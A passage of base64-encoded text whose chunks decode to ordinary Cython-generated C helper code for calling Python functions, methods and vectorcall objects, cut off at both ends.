FB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiVzKCkgZ290IG11bHRpcGxlIHZhbHVlcyBmb3Iga2V5d29yZCBhcmd1bWVudCAnJVUnIiwgZnVuY19uYW1lLCBrd19uYW1lKTsKfQoKCiNpZiBDWVRIT05fRkFTVF9QWUNBTEwgJiYgIUNZVEhPTl9WRUNUT1JDQUxMCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbE5vS3coUHlDb2RlT2JqZWN0ICpjbywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpnbG9iYWxzKSB7CiAgICBQeUZyYW1lT2JqZWN0ICpmOwogICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50OwogICAgUHlPYmplY3QgKipmYXN0bG9jYWxzOwogICAgUHlfc3NpemVfdCBpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIGFzc2VydChnbG9iYWxzICE9IE5VTEwpOwogICAgCiAgICBhc3NlcnQodHN0YXRlICE9IE5VTEwpOwogICAgZiA9IFB5RnJhbWVfTmV3KHRzdGF0ZSwgY28sIGdsb2JhbHMsIE5VTEwpOwogICAgaWYgKGYgPT0g""TlVMTCkgewogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgZmFzdGxvY2FscyA9IF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmKTsKICAgIGZvciAoaSA9IDA7IGkgPCBuYTsgaSsrKSB7CiAgICAgICAgUHlfSU5DUkVGKCphcmdzKTsKICAgICAgICBmYXN0bG9jYWxzW2ldID0gKmFyZ3MrKzsKICAgIH0KICAgIHJlc3VsdCA9IFB5RXZhbF9FdmFsRnJhbWVFeChmLDApOwogICAgKyt0c3RhdGUtPnJlY3Vyc2lvbl9kZXB0aDsKICAgIFB5X0RFQ1JFRihmKTsKICAgIC0tdHN0YXRlLT5yZWN1cnNpb25fZGVwdGg7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncykgewogICAgUHlDb2RlT2JqZWN0ICpjbyA9IChQeUNvZGVPYmplY3QgKilQeUZ1bmN0aW9uX0dFVF9DT0RFKGZ1bmMpOwogICAgUHlPYmplY3QgKmdsb2JhbHMgPSBQeUZ1bmN0aW9uX0dFVF9HTE9CQUxTKGZ1bmMpOwogICAgUHlPYmplY3QgKmFyZ2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9ERUZBVUxUUyhmdW5jKTsKICAgIFB5T2JqZWN0ICpjbG9zdXJlOwogICAgUHlPYmplY3QgKmt3ZGVmczsKICAgIFB5T2JqZWN0ICprd3R1cGxlLCAqKms7CiAgICBQeU9iamVjdCAqKmQ7CiAgICBQeV9zc2l6ZV90IG5kOwogICAgUHlfc3NpemVfdCBuazsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBhc3NlcnQoa3dhcmdzID09IE5VTEwgfHwgUHlEaWN0X0NoZWNrKGt3YXJncykpOwogICAgbmsgPSBrd2FyZ3MgPyBQeURpY3RfU2l6ZShrd2FyZ3MpIDogMDsKICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkgewogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgaWYgKAogICAgICAgICAgICBjby0+Y29fa3dvbmx5YXJnY291bnQgPT0gMCAmJgogICAgICAgICAgICBsaWtlbHkoa3dhcmdzID09IE5VTEwgfHwgbmsgPT0gMCkgJiYKICAgICAgICAgICAgY28tPmNvX2ZsYWdzID09IChDT19PUFRJTUlaRUQgfCBDT19ORVdMT0NBTFMgfCBDT19OT0ZSRUUpKSB7CiAgICAgICAgaWYgKGFyZ2RlZnMgPT0gTlVMTCAmJiBjby0+Y29fYXJnY291bnQgPT0gbmFyZ3MpIHsKICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbE5vS3coY28sIGFyZ3MsIG5hcmdzLCBnbG9iYWxzKTsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmIChuYXJncyA9PSAwICYmIGFyZ2RlZnMgIT0gTlVMTAogICAgICAgICAgICAgICAgICYmIGNvLT5jb19hcmdjb3VudCA9PSBQeV9TSVpFKGFyZ2RlZnMpKSB7CiAgICAgICAgICAgIAogICAgICAgICAgICBhcmdzID0gJlB5VHVwbGVfR0VUX0lURU0oYXJnZGVmcywgMCk7CiAgICAgICAgICAgIHJlc3VsdCA9""X19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbE5vS3coY28sIGFyZ3MsIFB5X1NJWkUoYXJnZGVmcyksIGdsb2JhbHMpOwogICAgICAgICAgICBnb3RvIGRvbmU7CiAgICAgICAgfQogICAgfQogICAgaWYgKGt3YXJncyAhPSBOVUxMKSB7CiAgICAgICAgUHlfc3NpemVfdCBwb3MsIGk7CiAgICAgICAga3d0dXBsZSA9IFB5VHVwbGVfTmV3KDIgKiBuayk7CiAgICAgICAgaWYgKGt3dHVwbGUgPT0gTlVMTCkgewogICAgICAgICAgICByZXN1bHQgPSBOVUxMOwogICAgICAgICAgICBnb3RvIGRvbmU7CiAgICAgICAgfQogICAgICAgIGsgPSAmUHlUdXBsZV9HRVRfSVRFTShrd3R1cGxlLCAwKTsKICAgICAgICBwb3MgPSBpID0gMDsKICAgICAgICB3aGlsZSAoUHlEaWN0X05leHQoa3dhcmdzLCAmcG9zLCAma1tpXSwgJmtbaSsxXSkpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKGtbaV0pOwogICAgICAgICAgICBQeV9JTkNSRUYoa1tpKzFdKTsKICAgICAgICAgICAgaSArPSAyOwogICAgICAgIH0KICAgICAgICBuayA9IGkgLyAyOwogICAgfQogICAgZWxzZSB7CiAgICAgICAga3d0dXBsZSA9IE5VTEw7CiAgICAgICAgayA9IE5VTEw7CiAgICB9CiAgICBjbG9zdXJlID0gUHlGdW5jdGlvbl9HRVRfQ0xPU1VSRShmdW5jKTsKICAgIGt3ZGVmcyA9IFB5RnVuY3Rpb25fR0VUX0tXX0RFRkFVTFRTKGZ1bmMpOwogICAgaWYgKGFyZ2RlZnMgIT0gTlVMTCkgewogICAgICAgIGQgPSAmUHlUdXBsZV9HRVRfSVRFTShhcmdkZWZzLCAwKTsKICAgICAgICBuZCA9IFB5X1NJWkUoYXJnZGVmcyk7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBkID0gTlVMTDsKICAgICAgICBuZCA9IDA7CiAgICB9CiAgICByZXN1bHQgPSBQeUV2YWxfRXZhbENvZGVFeCgoUHlPYmplY3QqKWNvLCBnbG9iYWxzLCAoUHlPYmplY3QgKilOVUxMLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJncywgKGludCluYXJncywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGssIChpbnQpbmssCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLCAoaW50KW5kLCBrd2RlZnMsIGNsb3N1cmUpOwogICAgUHlfWERFQ1JFRihrd3R1cGxlKTsKZG9uZToKICAgIFB5X0xlYXZlUmVjdXJzaXZlQ2FsbCgpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICB0ZXJuYXJ5ZnVuYyBjYWxsID0gUHlfVFlQRShmdW5jKS0+dHBfY2FsbDsKICAgIGlmICh1bmxpa2VseSghY2FsbCkpCiAgICAgICAgcmV0dXJuIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdyk7CiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpCiAg""ICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXN1bHQgPSAoKmNhbGwpKGZ1bmMsIGFyZywga3cpOwogICAgUHlfTGVhdmVSZWN1cnNpdmVDYWxsKCk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkgJiYgdW5saWtlbHkoIVB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKAogICAgICAgICAgICBQeUV4Y19TeXN0ZW1FcnJvciwKICAgICAgICAgICAgIk5VTEwgcmVzdWx0IHdpdGhvdXQgZXJyb3IgaW4gUHlPYmplY3RfQ2FsbCIpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHsKICAgIFB5T2JqZWN0ICpzZWxmLCAqcmVzdWx0OwogICAgUHlDRnVuY3Rpb24gY2Z1bmM7CiAgICBjZnVuYyA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYyk7CiAgICBzZWxmID0gX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9TRUxGKGZ1bmMpOwogICAgaWYgKHVubGlrZWx5KFB5X0VudGVyUmVjdXJzaXZlQ2FsbCgiIHdoaWxlIGNhbGxpbmcgYSBQeXRob24gb2JqZWN0IikpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gY2Z1bmMoc2VsZiwgYXJnKTsKICAgIFB5X0xlYXZlUmVjdXJzaXZlQ2FsbCgpOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAgICAgUHlFeGNfU3lzdGVtRXJyb3IsCiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxfZmFsbGJhY2soUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICogY29uc3QqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7CiAgICBQeU9iamVjdCAqYXJnc3R1cGxlOwogICAgUHlPYmplY3QgKnJlc3VsdCA9IDA7CiAgICBzaXplX3QgaTsKICAgIGFyZ3N0dXBsZSA9IFB5VHVwbGVfTmV3KChQeV9zc2l6ZV90KW5hcmdzKTsKICAgIGlmICh1bmxpa2VseSghYXJnc3R1cGxlKSkgcmV0dXJuIE5VTEw7CiAgICBmb3IgKGkgPSAwOyBpIDwgbmFyZ3M7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRihhcmdzW2ldKTsKICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShhcmdzdHVwbGUsIChQeV9zc2l6ZV90KWksIGFyZ3NbaV0pICE9ICgwKSkgZ290byBiYWQ7CiAgICB9CiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZ3N0dXBsZSwga3dhcmdzKTsK""ICBiYWQ6CiAgICBQeV9ERUNSRUYoYXJnc3R1cGxlKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKSBfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKQogICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2ZWN0b3JjYWxsZnVuYyBfX1B5eF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oUHlPYmplY3QgKmNhbGxhYmxlKSB7CiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShjYWxsYWJsZSk7CiAgICAjaWYgZGVmaW5lZChfX1B5eF9DeUZ1bmN0aW9uX1VTRUQpCiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KGNhbGxhYmxlKSkgewogICAgICAgIHJldHVybiBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChjYWxsYWJsZSk7CiAgICB9CiAgICAjZW5kaWYKICAgIGlmICghUHlUeXBlX0hhc0ZlYXR1cmUodHAsIFB5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKSkgewogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgYXNzZXJ0KFB5Q2FsbGFibGVfQ2hlY2soY2FsbGFibGUpKTsKICAgIFB5X3NzaXplX3Qgb2Zmc2V0ID0gdHAtPnRwX3ZlY3RvcmNhbGxfb2Zmc2V0OwogICAgYXNzZXJ0KG9mZnNldCA+IDApOwogICAgdmVjdG9yY2FsbGZ1bmMgcHRyOwogICAgbWVtY3B5KCZwdHIsIChjaGFyICopIGNhbGxhYmxlICsgb2Zmc2V0LCBzaXplb2YocHRyKSk7CiAgICByZXR1cm4gcHRyOwp9CiAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKSBQeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpCiAgI2VuZGlmCiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBfbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHsKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MoX25hcmdzKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgaWYgKG5hcmdzID09IDAgJiYga3dhcmdzID09IE5VTEwpIHsKICAgICAgICBpZiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIGxpa2VseSggX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfTk9BUkdTKSkKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRoTyhmdW5jLCBOVUxMKTsKICAgIH0KICAgIGVsc2UgaWYgKG5hcmdzID09IDEgJiYga3dhcmdzID09IE5VTEwpIHsKICAgICAgICBpZiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMp""ICYmIGxpa2VseSggX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfTykpCiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oZnVuYywgYXJnc1swXSk7CiAgICB9CiNlbmRpZgogICAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBCMQogICAgI2lmIENZVEhPTl9GQVNUX1BZQ0NBTEwKICAgIGlmIChQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSkgewogICAgICAgIGlmIChrd2FyZ3MpIHsKICAgICAgICAgICAgcmV0dXJuIF9QeUNGdW5jdGlvbl9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgbmFyZ3MsIGt3YXJncyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIF9QeUNGdW5jdGlvbl9GYXN0Q2FsbEtleXdvcmRzKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgICAgICB9CiAgICB9CiAgICBpZiAoIWt3YXJncyAmJiBfX1B5eF9JU19UWVBFKGZ1bmMsICZQeU1ldGhvZERlc2NyX1R5cGUpKSB7CiAgICAgICAgcmV0dXJuIF9QeU1ldGhvZERlc2NyX0Zhc3RDYWxsS2V5d29yZHMoZnVuYywgYXJncywgbmFyZ3MsIE5VTEwpOwogICAgfQogICAgI2VuZGlmCiAgICAjaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMCiAgICBpZiAoUHlGdW5jdGlvbl9DaGVjayhmdW5jKSkgewogICAgICAgIHJldHVybiBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCBuYXJncywga3dhcmdzKTsKICAgIH0KICAgICNlbmRpZgogICAgI2VuZGlmCiAgICBpZiAoa3dhcmdzID09IE5VTEwpIHsKICAgICAgICAjaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICB2ZWN0b3JjYWxsZnVuYyBmID0gX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGZ1bmMpOwogICAgICAgIGlmIChmKSB7CiAgICAgICAgICAgIHJldHVybiBmKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgICAgICNlbGlmIGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKSAmJiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTAogICAgICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykpIHsKICAgICAgICAgICAgX19weXhfdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGZ1bmMpOwogICAgICAgICAgICBpZiAoZikgcmV0dXJuIGYoZnVuYywgYXJncywgX25hcmdzLCBOVUxMKTsKICAgICAgICB9CiAgICAgICAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fVkVDVE9SQ0FMTAogICAgICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7CiAgICAgICAgI2VuZGlmCiAgICB9CiAgICBpZiAobmFyZ3MgPT0gMCkgewogICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBr""d2FyZ3MpOwogICAgfQogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd2FyZ3MpOwogICAgI2Vsc2UKICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbF9mYWxsYmFjayhmdW5jLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd2FyZ3MpOwogICAgI2VuZGlmCn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqYXJncywgUHlPYmplY3QgKmt3YXJncykgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIFB5T2JqZWN0ICpzZWxmbGVzc19hcmdzID0gUHlUdXBsZV9HZXRTbGljZShhcmdzLCAxLCBQeVR1cGxlX1NpemUoYXJncykpOwogICAgaWYgKHVubGlrZWx5KCFzZWxmbGVzc19hcmdzKSkgcmV0dXJuIE5VTEw7CiAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsKG1ldGhvZCwgc2VsZmxlc3NfYXJncywga3dhcmdzKTsKICAgIFB5X0RFQ1JFRihzZWxmbGVzc19hcmdzKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7CiAgICAgICAgcmV0dXJuIF9QeU9iamVjdF9WZWN0b3JjYWxsCiAgICAgICAgICAgIChtZXRob2QsIGFyZ3MgPyBhcmdzKzEgOiBOVUxMLCBuYXJncyA/IG5hcmdzLTEgOiAwLCBrd25hbWVzKTsKfQojZWxzZQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7CiAgICByZXR1cm4KI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMAogICAgX1B5T2JqZWN0X1ZlY3RvcmNhbGwKI2Vsc2UKICAgIFB5T2JqZWN0X1ZlY3RvcmNhbGwKI2VuZGlmCiAgICAgICAgKG1ldGhvZCwgYXJncyA/IGFyZ3MrMSA6IE5VTEwsIG5hcmdzID8gKHNpemVfdCkgbmFyZ3MtMSA6IDAsIGt3bmFtZXMpOwp9CiNlbmRpZgpzdGF0aWMgUHlNZXRob2REZWYgX19QeXhfVW5ib3VuZENNZXRob2RfRGVmID0gewogICAgICJDeXRob25VbmJvdW5kQ01ldGhvZCIsCiAgICAgX19QWVhfUkVJTlRFUlBSRVRfRlVOQ0lPTihQeUNGdW5jdGlvbiwgX19QeXhfU2VsZmxlc3NDYWxsKSwKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMw""QzAwMDAKICAgICBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTLAojZWxzZQogICAgIE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTLAojZW5kaWYKICAgICBOVUxMCn07CnN0YXRpYyBpbnQgX19QeXhfVHJ5VW5wYWNrVW5ib3VuZENNZXRob2QoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uKiB0YXJnZXQpIHsKICAgIFB5T2JqZWN0ICptZXRob2QsICpyZXN1bHQ9TlVMTDsKICAgIG1ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIodGFyZ2V0LT50eXBlLCAqdGFyZ2V0LT5tZXRob2RfbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIW1ldGhvZCkpCiAgICAgICAgcmV0dXJuIC0xOwogICAgcmVzdWx0ID0gbWV0aG9kOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBpZiAobGlrZWx5KF9fUHl4X1R5cGVDaGVjayhtZXRob2QsICZQeU1ldGhvZERlc2NyX1R5cGUpKSkKICAgIHsKICAgICAgICBQeU1ldGhvZERlc2NyT2JqZWN0ICpkZXNjciA9IChQeU1ldGhvZERlc2NyT2JqZWN0KikgbWV0aG9kOwogICAgICAgIHRhcmdldC0+ZnVuYyA9IGRlc2NyLT5kX21ldGhvZC0+bWxfbWV0aDsKICAgICAgICB0YXJnZXQtPmZsYWcgPSBkZXNjci0+ZF9tZXRob2QtPm1sX2ZsYWdzICYgfihNRVRIX0NMQVNTIHwgTUVUSF9TVEFUSUMgfCBNRVRIX0NPRVhJU1QgfCBNRVRIX1NUQUNLTEVTUyk7CiAgICB9IGVsc2UKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKI2Vsc2UKICAgIGlmIChQeUNGdW5jdGlvbl9DaGVjayhtZXRob2QpKQojZW5kaWYKICAgIHsKICAgICAgICBQeU9iamVjdCAqc2VsZjsKICAgICAgICBpbnQgc2VsZl9mb3VuZDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgc2VsZiA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcobWV0aG9kLCAiX19zZWxmX18iKTsKICAgICAgICBpZiAoIXNlbGYpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB9CiNlbHNlCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dFVF9TRUxGKG1ldGhvZCk7CiNlbmRpZgogICAgICAgIHNlbGZfZm91bmQgPSAoc2VsZiAmJiBzZWxmICE9IFB5X05vbmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgICAgICBQeV9YREVDUkVGKHNlbGYpOwojZW5kaWYKICAgICAgICBpZiAoc2VsZl9mb3VuZCkgewogICAgICAgICAgICBQeU9iamVjdCAqdW5ib3VuZF9tZXRob2QgPSBQeUNGdW5jdGlvbl9OZXcoJl9fUHl4X1VuYm91bmRDTWV0aG9kX0RlZiwgbWV0aG9kKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF1bmJvdW5kX21ldGhvZCkpIHJldHVybiAtMTsKICAgICAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgICAgIHJlc3VsdCA9IHVuYm91bmRfbWV0aG9kOwogICAgICAgIH0KICAgIH0KI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQ""WVRIT05fRlJFRVRIUkVBRElORwogICAgaWYgKHVubGlrZWx5KHRhcmdldC0+bWV0aG9kKSkgewogICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpOwogICAgfSBlbHNlCiNlbmRpZgogICAgdGFyZ2V0LT5tZXRob2QgPSByZXN1bHQ7CiAgICByZXR1cm4gMDsKfQoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcxLCBQeU9iamVjdCAqYXJnMikgewogICAgaW50IHdhc19pbml0aWFsaXplZCA9IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpOwogICAgaWYgKGxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMiAmJiBjZnVuYy0+ZnVuYykpIHsKICAgICAgICBQeU9iamVjdCAqYXJnc1syXSA9IHthcmcxLCBhcmcyfTsKICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gTUVUSF9GQVNUQ0FMTCkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIDIpOwogICAgICAgIH0KICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gKE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTKSkKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCAyLCBOVUxMKTsKICAgIH0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICBlbHNlIGlmICh1bmxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMSkpIHsKICAgICAgICBfX1B5eF9DYWNoZWRDRnVuY3Rpb24gdG1wX2NmdW5jID0gewojaWZuZGV